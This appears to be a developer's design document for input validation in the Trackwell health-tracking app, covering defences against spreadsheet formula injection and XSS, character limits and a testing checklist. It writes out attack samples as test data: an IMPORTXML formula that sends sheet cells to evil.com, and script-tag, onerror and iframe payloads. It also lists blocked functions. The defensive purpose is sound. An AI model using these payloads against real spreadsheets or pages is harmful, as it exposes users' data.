# Input Security Implementation

## Overview
Comprehensive input security implementation for the Trackwell health tracking application, protecting against:
- Google Sheets formula injection attacks
- XSS (Cross-Site Scripting) attacks
- Data overflow and resource exhaustion
- Malicious content injection

## Implementation Date
January 13, 2026

## Security Features

### 1. Character Limits
All text inputs are limited to prevent data overflow and improve UX:

| Input Type | Character Limit | Purpose |
|------------|-----------------|---------|
| Short Text | 60 characters | Names, dosages, symptoms |
| Long Text | 500 characters | Notes, descriptions |
| Google Sheet URLs | 200 characters | Sheet URL inputs |
| Filter Names | 20 characters | Saved filter names (existing) |

### 2. Google Sheets Formula Injection Prevention

#### Attack Vector
Google Sheets and Excel can execute formulas when data starts with `=`, `+`, `-`, or `@`. Malicious users could inject formulas like:
```
=IMPORTXML("https://evil.com/steal?data="&A1:Z100)
```

#### Protection Measures
- **Pattern Detection**: Blocks input starting with formula prefixes (`=`, `+`, `-`, `@`)
- **Function Blocking**: Detects dangerous functions:
  - `IMPORTXML`, `IMPORTHTML`, `IMPORTFEED`, `IMPORTDATA`
  - `IMPORTRANGE`, `HYPERLINK`, `IMAGE`, `WEBSERVICE`
- **Sanitization**: Prefixes dangerous characters with single quote (`'`) to neutralize formulas
- **Validation**: Real-time validation with user-friendly error messages

### 3. XSS Protection

#### Attack Vectors Blocked
- `<script>` tags and inline scripts
- `<iframe>`, `<object>`, `<embed>` tags
- Event handlers (`onclick`, `onerror`, `onload`, etc.)
- `javascript:`, `data:text/html`, `vbscript:` protocols
- `<link>` and `<style>` tags for CSS injection

#### Protection Measures
- HTML entity escaping: `< > & " ' /` → `&lt; &gt; &amp; &quot; &#x27; &#x2F;`
- Pattern-based detection with regex
- Real-time validation feedback

### 4. Visual Feedback

Users receive immediate feedback on input validity:
- **Character Counter**: Shows current/max characters (e.g., `45/60`)
- **Warning State**: Amber border when 90% capacity reached
- **Error State**: Red border when limit exceeded or dangerous content detected
- **Inline Messages**: Specific error messages explaining the issue
- **Blocking Submission**: Forms cannot be submitted with invalid input

## File Structure

### Core Security Library
**Location**: `/lib/inputSecurity.ts`

Key functions:
```typescript
// Validation
validateShortText(text, fieldName)
validateLongText(text, fieldName)
validateGoogleSheetURL(url, fieldName)

// Security checks
isTextSafe(text)
containsFormulaInjection(text)
containsXSS(text)

// Sanitization
sanitizeText(text)
sanitizeFormulaInjection(text)
escapeHTML(text)

// Character limits
CHARACTER_LIMITS.SHORT_TEXT    // 60
CHARACTER_LIMITS.LONG_TEXT     // 500
CHARACTER_LIMITS.GOOGLE_SHEET_URL // 200
```

### Reusable Components
**Location**: `/components/ui/SecureInput.tsx`

Components:
- `<SecureTextInput>` - For short text inputs (60 chars)
- `<SecureTextarea>` - For long text inputs (500 chars)
- `<SecureSheetURLInput>` - For Google Sheet URLs (200 chars)

All components include:
- Built-in validation
- Character counting
- Visual feedback
- Security checks
- Sanitization on blur

## Implementation by Page

### Entry Page (`/app/entry/page.tsx`)
**Status**: ✅ To Be Updated

Text inputs requiring security updates:
1. **Notes Field** (textarea)
   - Current: Basic XSS protection with `isNoteSafe()`
   - Update: Replace with `SecureTextarea` component (500 char limit)
   - Lines: 1124-1134

2. **Medicine Dosage Input**
   - Current: No character limit
   - Update: Replace with `SecureTextInput` component (60 char limit)
   - Lines: 312-327, 341-350

### Settings Page (`/app/settings/page.tsx`)
**Status**: ✅ Updated

Text inputs requiring security updates:
1. **Google Sheet URL** (2 locations)
   - Current: Regex validation only
   - Update: Replace with `SecureSheetURLInput` (200 char limit)
   - Lines: 1302-1314

2. **Sheet Name**
   - Current: No character limit
   - Update: Replace with `SecureTextInput` (60 char limit)
   - Lines: 1321-1328

3. **Custom Symptoms**
   - Current: No character limit
   - Update: Replace with `SecureTextInput` (60 char limit)
   - Lines: 1530-1538

4. **Custom Period Symptoms**
   - Current: No character limit
   - Update: Replace with `SecureTextInput` (60 char limit)
   - Lines: 1728-1736

### Recovery Page (`/app/recover/page.tsx`)
**Status**: ✅ Updated

Text inputs requiring security updates:
1. **Google Sheet URL**
   - Current: Regex validation only
   - Update: Replace with `SecureSheetURLInput` (200 char limit)
   - Lines: 110-117

### Medicine Form Components (`/components/settings/AddMedicineForm.tsx`)
**Status**: ✅ Updated

Text inputs requiring security updates:
1. **Medicine Name**
   - Current: Duplicate check only
   - Update: Add `SecureTextInput` wrapper (60 char limit)
   - Lines: 211-217

2. **Medicine Dosage**
   - Current: Duplicate check only
   - Update: Add `SecureTextInput` wrapper (60 char limit)
   - Lines: 255-262

### Medicine Item Component (`/components/settings/MedicineItem.tsx`)
**Status**: ✅ Updated

Text inputs requiring security updates:
1. **Medicine Name (Edit)**
   - Update: Add validation with 60 char limit
   - Lines: 136-142

2. **Medicine Dosage (Edit)**
   - Update: Add validation with 60 char limit
   - Lines: 174-181

### Custom Product Section (`/components/settings/CustomProductSection.tsx`)
**Status**: ✅ Updated

Text inputs requiring security updates:
1. **Custom Product Name**
   - Current: Duplicate check only
   - Update: Add `SecureTextInput` wrapper (60 char limit)
   - Lines: 94-107

### Filter Modal (`/components/history/SaveFilterModal.tsx`)
**Status**: ✅ Updated

This component already has character limits (20 chars) and proper validation.
- Update: Add formula injection and XSS checks using `isTextSafe()`

## Migration Strategy

### Phase 1: Core Library (✅ Complete)
- Created `/lib/inputSecurity.ts` with all validation functions
- Created `/components/ui/SecureInput.tsx` with reusable components
- Created documentation

### Phase 2: Update Critical Pages
1. Entry page (notes, medicine dosages)
2. Settings page (Google Sheet URL, sheet name)
3. Recovery page (Google Sheet URL)

### Phase 3: Update Components
1. Medicine form components
2. Product components
3. Filter modal (add security checks)

### Phase 4: Testing
1. Test character limits on all inputs
2. Test formula injection prevention
3. Test XSS protection
4. Test visual feedback
5. Test form submission blocking

## Testing Checklist

### Character Limits
- [ ] Try entering 61+ characters in short text fields
- [ ] Try entering 501+ characters in long text fields
- [ ] Try entering 201+ characters in Google Sheet URLs
- [ ] Verify visual feedback (amber warning at 90%, red at 100%+)
- [ ] Verify submission is blocked when over limit

### Formula Injection
- [ ] Try entering `=SUM(A1:A10)` in text fields
- [ ] Try entering `+1+1` at start of text
- [ ] Try entering `-1-1` at start of text
- [ ] Try entering `@A1` at start of text
- [ ] Try entering `=IMPORTXML("http://evil.com")` in notes
- [ ] Verify sanitization adds `'` prefix

### XSS Protection
- [ ] Try entering `<script>alert('xss')</script>`
- [ ] Try entering `<img src=x onerror=alert(1)>`
- [ ] Try entering `<iframe src="evil.com"></iframe>`
- [ ] Try entering `onclick="alert(1)"`
- [ ] Verify HTML is escaped in display

### User Experience
- [ ] Character counter updates in real-time
- [ ] Error messages are clear and helpful
- [ ] Warning state appears at 90% capacity
- [ ] Can still type over limit to see error
- [ ] Errors appear on blur, not immediately on typing
- [ ] Submission button disabled when validation fails

## Security Best Practices

### Client-Side Security
✅ **Implemented**:
- Input validation and sanitization
- Character limits
- Pattern-based detection
- Visual feedback

⚠️ **Limitations**:
- Client-side validation can be bypassed
- No server-side validation (no backend)
- Data stored in user's Google Sheet (controlled by user)

### Data Flow
1. User enters text → Client-side validation
2. Validation passes → Sanitization applied
3. Sanitized text → Stored in localStorage
4. On Google Sheets sync → Sanitized text sent to user's own sheet

### Threat Model
**Protected Against**:
- ✅ Accidental formula injection
- ✅ Copy-paste attacks from malicious sources
- ✅ XSS in local app display
- ✅ Data overflow/resource exhaustion

**Not Protected Against** (by design):
- ❌ Intentional tampering by technically skilled users (they own the data)
- ❌ Direct Google Sheets manipulation (user has full access)
- ❌ Browser DevTools manipulation (client-side only)

This is acceptable because:
- Users control their own data
- No backend means no server-side attacks
- No multi-user system means no privilege escalation
- Data stored in user's own Google Sheet

## Future Enhancements

Consider if/when backend is added:
1. **Server-side validation**: Validate all inputs on API endpoints
2. **Rate limiting**: Prevent abuse of API endpoints
3. **Content Security Policy (CSP)**: HTTP headers to prevent XSS
4. **Input sanitization library**: Use DOMPurify or similar
5. **Audit logging**: Track input validation failures
6. **CAPTCHA**: Prevent automated abuse

## References

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Google Sheets Formula Injection](https://blog.securelayer7.net/formula-injection-in-csv-files/)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Implementation Status**: Core library and components created, ready for integration.
**Next Step**: Update Entry page to use secure components.
